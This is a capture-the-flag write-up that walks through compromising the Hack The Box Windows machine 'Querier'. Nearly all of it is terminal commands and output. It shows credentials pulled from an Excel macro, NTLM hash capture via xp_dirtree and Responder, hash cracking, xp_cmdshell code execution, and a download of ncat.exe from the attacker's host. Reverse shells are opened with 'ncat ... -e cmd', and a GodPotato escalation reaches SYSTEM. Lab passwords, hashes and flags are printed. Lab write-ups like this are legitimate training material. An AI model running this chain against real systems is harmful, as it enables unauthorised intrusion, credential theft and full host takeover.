| Category          | Details                                                                                                    |
|-------------------|------------------------------------------------------------------------------------------------------------|
| 📝 **Name**       | [Querier](https://app.hackthebox.com/machines/Querier)                                                     |  
| 🏷 **Type**       | HTB Machine                                                                                                |
| 🖥 **OS**         | Windows                                                                                                    |
| 🎯 **Difficulty** | Medium                                                                                                     |
| 📁 **Tags**       | SMB enumeration, XSLM macro, MSSQL, NTLM hash steal via EXEC xp_dirtree, SeImpersonatePrivilege, GodPotato |

### User flag

#### Scan target with `nmap`
```
┌──(magicrc㉿perun)-[~/attack/HTB Querier]
└─$ nmap -sS -sC -sV -p- $TARGET
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-12 11:25 +0200
Nmap scan report for 10.129.44.203
Host is up (0.044s latency).
Not shown: 65521 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-info: 
|   10.129.44.203:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-05-12T09:22:53
|_Not valid after:  2056-05-12T09:22:53
|_ssl-date: 2026-05-12T09:27:17+00:00; +1s from scanner time.
| ms-sql-ntlm-info: 
|   10.129.44.203:1433: 
|     Target_Name: HTB
|     NetBIOS_Domain_Name: HTB
|     NetBIOS_Computer_Name: QUERIER
|     DNS_Domain_Name: HTB.LOCAL
|     DNS_Computer_Name: QUERIER.HTB.LOCAL
|     DNS_Tree_Name: HTB.LOCAL
|_    Product_Version: 10.0.17763
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-05-12T09:27:09
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 95.93 seconds
```

#### Enumerate SMB
```
┌──(magicrc㉿perun)-[~/attack/HTB Querier]
└─$ smbclient -L //$TARGET -N

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Reports         Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.44.203 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

#### Enumerate `Reports` SMB share
```
┌──(magicrc㉿perun)-[~/attack/HTB Querier]
└─$ smbclient //$TARGET/Reports -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Jan 29 00:23:48 2019
  ..                                  D        0  Tue Jan 29 00:23:48 2019
  Currency Volume Report.xlsm         A    12229  Sun Jan 27 23:21:34 2019

                5158399 blocks of size 4096. 849989 blocks available
smb: \> get "Currency Volume Report.xlsm"
getting file \Currency Volume Report.xlsm of size 12229 as Currency Volume Report.xlsm (52.6 KiloBytes/sec) (average 52.6 KiloBytes/sec)
```

#### Discover `reporting:PcwTWTHRwryjc$c6` credentials in macro of exfiltrated .xlsm document
```
┌──(magicrc㉿perun)-[~/attack/HTB Querier]
└─$ file Currency\ Volume\ Report.xlsm                                                                         
Currency Volume Report.xlsm: Microsoft Excel 2007+
                                                                                                                                                                                                    
┌──(magicrc㉿perun)-[~/attack/HTB Querier]
└─$ unzip Currency\ Volume\ Report.xlsm -d XLSM
Archive:  Currency Volume Report.xlsm
  inflating: XLSM/[Content_Types].xml  
  inflating: XLSM/_rels/.rels        
  inflating: XLSM/xl/workbook.xml    
  inflating: XLSM/xl/_rels/workbook.xml.rels  
  inflating: XLSM/xl/worksheets/sheet1.xml  
  inflating: XLSM/xl/theme/theme1.xml  
  inflating: XLSM/xl/styles.xml      
  inflating: XLSM/xl/vbaProject.bin  
  inflating: XLSM/docProps/core.xml  
  inflating: XLSM/docProps/app.xml   
                                                                                                                                                                                                    
┌──(magicrc㉿perun)-[~/attack/HTB Querier]
└─$ strings XLSM/xl/vbaProject.bin
<SNIP>
Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6
<SNIP>
```

#### Access MSSQL instance running on target using `reporting:PcwTWTHRwryjc$c6` credentials
```
┌──(magicrc㉿perun)-[~/attack/HTB Querier]
└─$ impacket-mssqlclient 'reporting:PcwTWTHRwryjc$c6'@$TARGET -windows-auth
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: volume
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'volume'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL (QUERIER\reporting  reporting@volume)> 
```

#### Start `reponder` to intercept SMB network traffic
```
┌──(magicrc㉿perun)-[~/attack/HTB Querier]
└─$ sudo responder -I tun0
<SNIP>
    SMB server                 [ON]
<SNIP>
[+] Listening for events...
```

#### Trigger SMB request
```
SQL (QUERIER\reporting  reporting@volume)> xp_dirtree \\10.10.16.193\share
subdirectory   depth   file   
------------   -----   ----
```

#### Capture NTLM hash for `QUERIER\mssql-svc`
```
[SMB] NTLMv2-SSP Client   : 10.129.44.203
[SMB] NTLMv2-SSP Username : QUERIER\mssql-svc
[SMB] NTLMv2-SSP Hash     : mssql-svc::QUERIER:8a63dbac1ed3e59d:6E5E4012F7FD08FD2194069A25FE9F14:010100000000000080F9C7B0F6E2DC011F0916DBA08CADF000000000020008004E00330051004A0001001E00570049004E002D0038004B0053005900560048004B004A0046004300320004003400570049004E002D0038004B0053005900560048004B004A004600430032002E004E00330051004A002E004C004F00430041004C00030014004E00330051004A002E004C004F00430041004C00050014004E00330051004A002E004C004F00430041004C000700080080F9C7B0F6E2DC010600040002000000080030003000000000000000000000000030000017078CDF21B8F355E9F55BAD2AFF5168CBAF2A25A7018EC9BDFB43B2EEF427E70A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310036002E00310039003300000000000000000000000000
```

#### Break hash using `hashcat`
```
┌──(magicrc㉿perun)-[~/attack/HTB Querier]
└─$ hashcat -m 5600 'mssql-svc::QUERIER:ed13a36a4d8bce0c:8C879416C4AAEF44D0688A4505BD18B6:01010000000000008003B0421EE2DC019B45D484C2A275B300000000020008004800480032004B0001001E00570049004E002D0044005200480046004F0039005500310037005600520004003400570049004E002D0044005200480046004F003900550031003700560052002E004800480032004B002E004C004F00430041004C00030014004800480032004B002E004C004F00430041004C00050014004800480032004B002E004C004F00430041004C00070008008003B0421EE2DC0106000400020000000800300030000000000000000000000000300000342BDB9A1A684CEB0D59DAF3BF51D2397E8D7DA0D461E5BB24EC9F706BDC7E280A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310036002E00310039003300000000000000000000000000' /usr/share/wordlists/rockyou.txt --quiet
MSSQL-SVC::QUERIER:ed13a36a4d8bce0c:8c879416c4aaef44d0688a4505bd18b6:01010000000000008003b0421ee2dc019b45d484c2a275b300000000020008004800480032004b0001001e00570049004e002d0044005200480046004f0039005500310037005600520004003400570049004e002d0044005200480046004f003900550031003700560052002e004800480032004b002e004c004f00430041004c00030014004800480032004b002e004c004f00430041004c00050014004800480032004b002e004c004f00430041004c00070008008003b0421ee2dc0106000400020000000800300030000000000000000000000000300000342bdb9a1a684ceb0d59daf3bf51d2397e8d7da0d461e5bb24ec9f706bdc7e280a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310036002e00310039003300000000000000000000000000:corporate568
```

#### Access MSSQL instance running on target using `mssql-svc:corporate568` credentials
```
┌──(magicrc㉿perun)-[~/attack/HTB Querier]
└─$ impacket-mssqlclient mssql-svc:corporate568@$TARGET -windows-auth
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'master'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL (QUERIER\mssql-svc  dbo@master)>
```

#### Verify code execution via `xp_cmdshell`
```
SQL (QUERIER\mssql-svc  dbo@master)> enable_xp_cmdshell
INFO(QUERIER): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
INFO(QUERIER): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (QUERIER\mssql-svc  dbo@master)> xp_cmdshell whoami
output              
-----------------   
querier\mssql-svc   

NULL 
```

#### Start `nc` to listen for reverse shell connection
```
┌──(magicrc㉿perun)-[~/attack/HTB Querier]
└─$ nc -lvnp 4444                                              
listening on [any] 4444 ...
```
Since AV is in place we are not able to use Metasploit.

#### Deliver `ncat.exe` binary to target
```
SQL (QUERIER\mssql-svc  dbo@master)> xp_cmdshell powershell wget http://10.10.16.193/static-binaries/binaries/windows/x86/ncat.exe -OutFile C:\Users\mssql-svc\Downloads\ncat.exe
output   
------   
NULL
```

#### Spawn reverse shell connection using `ncat.exe`
```
SQL (QUERIER\mssql-svc  dbo@master)> xp_cmdshell C:\Users\mssql-svc\Downloads\ncat.exe 10.10.16.193 4444 -e cmd
```

#### Confirm foothold gained
```
connect to [10.10.16.193] from (UNKNOWN) [10.129.44.203] 49679
Microsoft Windows [Version 10.0.17763.292]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
querier\mssql-svc
```

#### Capture user flag
```
C:\Windows\system32>type C:\Users\mssql-svc\Desktop\user.txt
6fa1db1ea64219495fe9bfdb88485155
```

### Root flag

#### Enumerate privileges of `mssql-svc` user
```
C:\Windows\system32>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```
With `SeImpersonatePrivilege` enabled we can conduct potato attack to escalate to `SYSTEM`.

#### Check version of system
```
C:\Windows\system32>systeminfo

Host Name:                 QUERIER
OS Name:                   Microsoft Windows Server 2019 Standard
OS Version:                10.0.17763 N/A Build 17763
```
`GodPotato` is compatible with Server 2019 Build 17763. 

#### Start `nc` to listen for reverse shell connection for `SYSTEM`
```
┌──(magicrc㉿perun)-[~/attack/HTB Querier]
└─$ nc -lvnp 5555                                              
listening on [any] 5555 ...
```

#### Deliver `GodPotato-NET4.exe` exploit
```
┌──(magicrc㉿perun)-[~/attack/HTB Querier]
└─$ wget -q https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe && \
impacket-smbserver share . -smb2support
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
```

```
C:\Windows\system32>net use \\10.10.16.193\share
net use \\10.10.16.193\share
The command completed successfully.


C:\Windows\system32>copy \\10.10.16.193\share\GodPotato-NET4.exe C:\Users\mssql-svc\Downloads\GodPotato-NET4.exe
copy \\10.10.16.193\share\GodPotato-NET4.exe C:\Users\mssql-svc\Downloads\GodPotato-NET4.exe
        1 file(s) copied.
```

#### Spawn reverse shell connection using `GodPotato-NET4.exe` and `ncat.exe`
```
C:\Windows\system32>C:\Users\mssql-svc\Downloads\GodPotato-NET4.exe -cmd "C:\Users\mssql-svc\Downloads\ncat.exe 10.10.16.193 5555 -e cmd"
C:\Users\mssql-svc\Downloads\GodPotato-NET4.exe -cmd "C:\Users\mssql-svc\Downloads\ncat.exe 10.10.16.193 5555 -e cmd"
[*] CombaseModule: 0x140704351846400
[*] DispatchTable: 0x140704354159824
[*] UseProtseqFunction: 0x140704353538144
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\9dc2efbc-ff82-43fe-9a2d-7e34a37dacc3\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00004402-1050-ffff-8936-9169957d12cd
[*] DCOM obj OXID: 0x24c80b46c377157e
[*] DCOM obj OID: 0x9ad4f8a4dfb064ce
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 840 Token:0x804  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 4824
```

#### Confirm escalation
```
connect to [10.10.16.193] from (UNKNOWN) [10.129.44.203] 49685
Microsoft Windows [Version 10.0.17763.292]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

#### Capture root flag
```
C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
813501692d8796b32a422a92a6b8b646
```
